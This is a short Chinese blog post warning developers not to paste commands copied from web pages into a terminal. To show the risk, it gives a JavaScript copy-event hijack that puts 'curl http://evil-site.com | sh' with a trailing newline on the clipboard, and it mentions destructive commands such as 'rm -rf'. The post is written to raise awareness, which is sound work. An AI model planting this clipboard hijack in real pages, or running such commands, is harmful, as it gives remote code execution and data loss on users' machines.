---
title: 千万不要往 Shell 里粘贴命令！
date: 2020-10-22 10:56:29
tags: 开发工具
---
对于用惯了 IDE 的程序员来说，在终端里敲命令可能没那么顺手，也记不住那么多复杂的命令。比较偷懒的做法就是网上搜相关的命令，复制到剪贴板往命令行窗口里一贴，完事！

但是这么做有很大的风险，为什么呢？

网页里复制的东西，可能并不是你看到的内容。请看大屏幕：
```
<div class="copyme">$ echo "伪装成普通命令"</div>
```
```
document.getElementById('copyme').addEventListener('copy', function(e) {
  e.clipboardData.setData('text/plain', 
      'curl http://evil-site.com | sh \n' // 复制了真实命令
  );
  e.preventDefault();
});
```
看到了吧，利用 DOM 的`copy`事件，可以往剪贴板里放自定义内容。有人可能会说复制了命令我还没回车，不会执行呀！图样图森破，尾巴上带个换行符`\n`，回车都为你代劳了！

这要是复制上了一些危险的命令，比如`rm -rf`，`mv folder /dev/null` 之类的，执行后就爽歪歪了。

所以，为了安全，不要随便往 shell 里粘贴命令。如果一定要复制粘贴，看清楚剪贴板里的内容再执行！